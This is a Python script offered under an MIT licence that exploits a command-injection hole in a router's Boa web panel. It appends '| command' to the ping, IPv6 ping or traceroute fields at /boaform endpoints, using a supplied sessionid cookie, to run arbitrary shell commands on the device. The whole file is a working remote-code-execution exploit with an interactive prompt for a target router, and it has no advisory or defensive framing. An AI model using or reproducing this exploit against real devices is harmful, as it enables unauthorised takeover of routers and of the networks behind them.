#!/usr/bin/env python3
#This software is licensed under MIT
#Copyright goes to: ma1de (2025)
#This software comes with absolutely no warranty
import requests
import threading

def main():
    start()

# TODO implement more cases for responses
def handle_response(response): 
    if not isinstance(response, requests.Response):
        print("Wrong parameter")
        return

    content = response.content

    if "/admin/login.asp" in str(content):
        print("Invalid sessionid.")
        return

    print(f"Got a response: {content}")

def execute_command(address, token, commands, mode):
    headers = {'Cookie': f'sessionid={token}'}

    match mode:
        case 1:
            for command in commands:
                handle_response(requests.post(
                    f'http://{address}/boaform/formPing', 
                    data=f'pingAddr=1.1.1.1+|+{command.replace(' ', '+')}&wanif=65535', 
                    headers=headers))
        case 2:
            for command in commands:
                handle_response(requests.post(
                    f'http://{address}/boaform/formPing6', 
                    data=f'pingAddr=::+|+{command.replace(' ', '+')}&wanif=65535', 
                    headers=headers))
        case 3:
            for command in commands:
                handle_response(requests.post(
                    f'http://{address}/boaform/formTracert', 
                    data=f'proto=0&traceAddr=1.1.1.1+|+{command.replace(' ', '+')}&trys=3&timeout=5&datasize=56&dscp=0&maxhop=30&wanif=65535', 
                    headers=headers))
        case _:
            print("Unsupported mode: " + mode)

def start():
    print("This program has 3 different modes")
    print("1) IPv4 Ping Mode")
    print("2) IPv6 Ping Mode")
    print("3) Traceroute Mode")
    mode = input("Please choose the mode: ")

    while mode not in [1, 2, 3, "1", "2", "3"]:
        mode = input("Please choose the mode: ")

    mode = int(mode)

    address = input("Please supply your vulnerable router IP address: ")

    token = input("Please supply the sessionid for the web panel: ")

    command = input("Supply commands to execute, when done type rce#fi: ")

    commands = []

    while command != 'rce#fi':
        commands.append(command)
        command = input("Supply commands to execute, when done type rce#fi: ")

    if len(commands) == 0:
        print("Commands are emtpy!")
        return

    thread = threading.Thread(target=execute_command, args=(address, token, commands, mode))
    thread.start()

if __name__ == "__main__":
    main()